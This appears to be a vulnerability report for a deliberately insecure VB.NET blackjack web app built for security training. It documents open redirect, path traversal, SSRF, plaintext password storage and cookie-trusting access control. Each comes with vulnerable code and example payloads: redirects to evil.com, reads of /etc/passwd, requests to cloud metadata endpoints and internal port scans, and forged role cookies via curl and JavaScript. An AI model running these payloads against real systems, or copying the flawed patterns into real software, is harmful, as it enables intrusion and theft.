# Security Vulnerabilities Report - Blackjack Table Application

> **⚠️ DISCLAIMER:** This application was intentionally built with security vulnerabilities for educational and testing purposes. **DO NOT deploy this to production.**

---

## Table of Contents
1. [Open Redirect](#1-open-redirect-cwe-601)
2. [Path Traversal](#2-path-traversal-cwe-22)
3. [Server-Side Request Forgery (SSRF)](#3-server-side-request-forgery-ssrf-cwe-918)
4. [Plaintext Password Storage](#4-plaintext-password-storage-cwe-256)
5. [Broken Access Control](#5-broken-access-control-cwe-639)

---

## 1. Open Redirect (CWE-601)

### Description
The `/navigate` endpoint redirects users to any URL without validation, allowing attackers to redirect victims to malicious external sites.

### Vulnerable Code Location
**File:** `Program.vb`  
**Lines:** 78-86

```vb
ElseIf path = "/navigate" Then
    Dim urlParam = request.QueryString("url")
    If Not String.IsNullOrEmpty(urlParam) Then
        response.StatusCode = 302
        response.RedirectLocation = urlParam  ' ⚠️ No URL validation
        response.Close()
    Else
        SendResponse(response, "Missing url parameter", 400)
    End If
```

### Attack Vector
```bash
# Redirect to external malicious site
http://localhost:3000/navigate?url=https://evil.com

# Can be used in phishing attacks
http://localhost:3000/navigate?url=http://attacker.com/phishing-page
```

---

## 2. Path Traversal (CWE-22)

### Description
The `/settings/load` endpoint reads files from disk using unsanitized user input, allowing attackers to read arbitrary files on the server.

### Vulnerable Code Location
**File:** `Program.vb`  
**Lines:** 88-105

```vb
ElseIf path = "/settings/load" Then
    Dim configName = request.QueryString("config")
    If Not String.IsNullOrEmpty(configName) Then
        Dim configPath = $"configs/{configName}.json"  ' ⚠️ No path sanitization
        If File.Exists(configPath) Then
            Dim jsonContent = File.ReadAllText(configPath)
            ' ... returns file content
```

### Attack Vectors
```bash
# Read the main program file
http://localhost:3000/settings/load?config=../Program

# Traverse multiple directories
http://localhost:3000/settings/load?config=../../../../../../etc/passwd

# Read project files
http://localhost:3000/settings/load?config=../package

# Windows example
http://localhost:3000/settings/load?config=../../Windows/System32/drivers/etc/hosts
```


---

## 3. Server-Side Request Forgery (SSRF) (CWE-918)

### Description
The `/background/proxy` endpoint fetches any URL provided by the user without validation, allowing attackers to make requests to internal services and scan the internal network.

### Vulnerable Code Location
**File:** `Program.vb`  
**Lines:** 794-839

```vb
Sub HandleBackgroundProxy(request As HttpListenerRequest, response As HttpListenerResponse)
    Try
        Dim srcUrl = request.QueryString("src")  ' ⚠️ No URL validation
        If String.IsNullOrEmpty(srcUrl) Then
            SendResponse(response, "Missing src parameter", 400)
            Return
        End If
        
        Console.WriteLine($"Proxying image: {srcUrl}")
        
        ' Fetch the image using HttpClient
        Dim task = httpClient.GetAsync(srcUrl)  ' ⚠️ Fetches ANY URL
        task.Wait()
        Dim httpResponse = task.Result
```

### Attack Vectors

#### 1. Access Internal Services
```bash
# Access the application itself
http://localhost:3000/background/proxy?src=http://localhost:3000/

# Access chat history
http://localhost:3000/background/proxy?src=http://localhost:3000/chat/history

# Bypass authentication on dashboard
http://localhost:3000/background/proxy?src=http://localhost:3000/dashboard
```

#### 2. Port Scanning
```bash
# Scan for MySQL
http://localhost:3000/background/proxy?src=http://localhost:3306

# Scan for PostgreSQL
http://localhost:3000/background/proxy?src=http://localhost:5432

# Scan for Redis
http://localhost:3000/background/proxy?src=http://localhost:6379
```

#### 3. Cloud Metadata Exploitation
```bash
# AWS metadata endpoint
http://localhost:3000/background/proxy?src=http://169.254.169.254/latest/meta-data/

# GCP metadata endpoint
http://localhost:3000/background/proxy?src=http://metadata.google.internal/computeMetadata/v1/

# Azure metadata endpoint
http://localhost:3000/background/proxy?src=http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

#### 4. Internal Network Reconnaissance
```bash
# Scan internal network
http://localhost:3000/background/proxy?src=http://192.168.1.1
http://localhost:3000/background/proxy?src=http://10.0.0.1
http://localhost:3000/background/proxy?src=http://172.16.0.1
```
---

## 4. Plaintext Password Storage (CWE-256)

### Description
User passwords are stored in memory as plaintext without any hashing or encryption.

### Vulnerable Code Location
**File:** `Program.vb`  
**Lines:** 530-534 (Signup) and 578 (Login)

```vb
' Signup handler
Dim newUser As New User With {
    .Username = username,
    .Password = password,  ' ⚠️ Stored as plaintext
    .Role = "player"
}
users.Add(newUser)

' Login handler
Dim user = users.Find(Function(u) u.Username = username And u.Password = password)
```

### Attack Vector
```bash
# Sign up with a test account
curl -X POST http://localhost:3000/signup \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=victim&password=MySecretPassword123"

# Password is now stored in plaintext in server memory
# Any server compromise exposes all passwords
```

---

## 5. Broken Access Control (CWE-639)

### Description
The dealer dashboard checks authorization using a client-controlled cookie value, allowing any user to gain admin access by modifying their cookies.

### Vulnerable Code Location
**File:** `Program.vb`  
**Lines:** 869-874

```vb
Sub ServeDashboardPage(request As HttpListenerRequest, response As HttpListenerResponse)
    Dim role = GetCookieValue(request, "role")  ' ⚠️ Reads from client cookie
    
    Dim html As String
    
    If role = "dealer" Then  ' ⚠️ Trusts client-provided value
        ' Show dealer dashboard
```

**Cookie Functions:**
**Lines:** 406-418

```vb
Function GetCookieValue(request As HttpListenerRequest, cookieName As String) As String
    If request.Cookies(cookieName) IsNot Nothing Then
        Return request.Cookies(cookieName).Value  ' ⚠️ No validation
    End If
    Return Nothing
End Function

Sub SetAuthCookie(response As HttpListenerResponse, username As String, role As String)
    Dim userCookie As New Cookie("username", username) With {.Path = "/"}
    Dim roleCookie As New Cookie("role", role) With {.Path = "/"}  ' ⚠️ Client-side role storage
    response.SetCookie(userCookie)
    response.SetCookie(roleCookie)
End Sub
```

### Attack Vectors

#### 1. Browser DevTools Cookie Manipulation
```
Steps:
1. Sign up as regular user: http://localhost:3000/auth
2. Open DevTools (F12) → Application → Cookies
3. Change 'role' cookie from 'player' to 'dealer'
4. Navigate to http://localhost:3000/dashboard
5. ✅ Full admin access granted
```

#### 2. JavaScript Console Attack
```javascript
// Run in browser console at http://localhost:3000/dashboard
document.cookie = "role=dealer; path=/"; 
location.reload();
// ✅ Instant admin access
```

#### 3. curl with Forged Cookies
```bash
# Access dashboard without ever logging in
curl -H "Cookie: role=dealer; username=FakeAdmin" \
  http://localhost:3000/dashboard

# Full dealer dashboard HTML returned ✅
```

#### 4. Automated Privilege Escalation
```bash
# Script to escalate any account
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=normaluser&password=password123" \
  -c cookies.txt

# Modify the cookie file
sed -i 's/role\tplayer/role\tdealer/g' cookies.txt

# Access dealer dashboard with modified cookie
curl -b cookies.txt http://localhost:3000/dashboard
```

---

## Testing Environment Setup

### Prerequisites
- .NET 8.0 or .NET 10.0 SDK
- VB.NET support

### Running the Vulnerable Application
```bash
cd /path/to/vb-blackjack-claude
dotnet run
```

Access at: `http://localhost:3000/`

### Default Test Credentials
- **Dealer Account:** username=`dealer`, password=`dealer123`
- **Regular User:** Create via `/auth` page
